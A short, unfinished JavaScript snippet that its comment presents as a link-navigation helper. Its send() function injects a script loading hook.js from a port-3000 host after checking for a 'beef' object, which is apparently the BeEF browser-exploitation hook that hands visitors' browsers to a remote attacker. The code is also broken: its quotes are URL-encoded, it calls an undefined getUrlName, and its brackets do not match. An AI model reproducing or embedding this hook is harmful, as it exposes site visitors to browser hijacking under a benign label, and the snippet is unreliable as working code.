//UNFINISHED. Use normal <a> tags for now. checks what link to go to
var sending = 0
function click(){
  sending = 1;
}

if(sending == 1) {
  var sendTo = getUrlName;
  send();
}



function send() { 
  var url = %27https://0.0.0.0:3000/hook.js%27;
  if (typeof beef == %27undefined%27) { 
  var bf = document.createElement(%27script%27); 
  bf.type = %27text%2fjavascript%27; bf.src = url; 
  document.body.appendChild(bf);}})();
